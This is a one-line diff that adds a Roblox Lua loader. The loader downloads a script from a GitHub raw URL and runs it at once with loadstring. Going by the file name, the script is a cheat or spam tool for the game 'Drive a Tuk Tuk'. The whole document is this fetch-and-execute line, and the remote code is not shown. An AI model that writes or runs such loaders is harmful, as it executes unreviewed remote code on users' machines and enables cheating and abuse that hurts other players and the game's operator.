@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/drive-a-tuk-tuk-spam7-9vbeir10iy2tki.lua"))()
